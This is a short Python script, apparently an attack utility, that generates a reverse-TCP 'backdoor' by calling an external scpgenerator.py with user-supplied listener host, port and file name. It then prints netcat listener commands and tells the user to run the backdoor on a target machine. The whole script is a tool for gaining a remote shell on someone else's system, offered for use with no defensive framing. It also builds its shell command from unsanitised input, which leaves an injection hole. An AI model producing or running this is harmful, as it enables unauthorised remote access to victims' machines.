import socket
import subprocess
import os

def generate_backdoor(listen_address, listen_port, output_name, payload=None):
    if payload is None:
        payload = 'reverse_tcp'

    command = f'scpgenerator.py -t {payload} -lh {listen_address} -lp {listen_port} -o {output_name}.py'
    subprocess.run(command, shell=True)

    print(f"Your backdoor '{output_name}.py' has been generated!")
    print("Start your listener with 'python -m pty' or with 'multi/handler' or with netcat:")
    print(f"nc -lvp {listen_port}")
    print("Run the backdoor on target machine with:")
    print(f"python {output_name}.py")

# Example usage:
listen_address = input("Enter listening host: ")
listen_port = int(input("Enter listening port: "))
output_name = input("Enter output name without .py: ")

generate_backdoor(listen_address, listen_port, output_name)
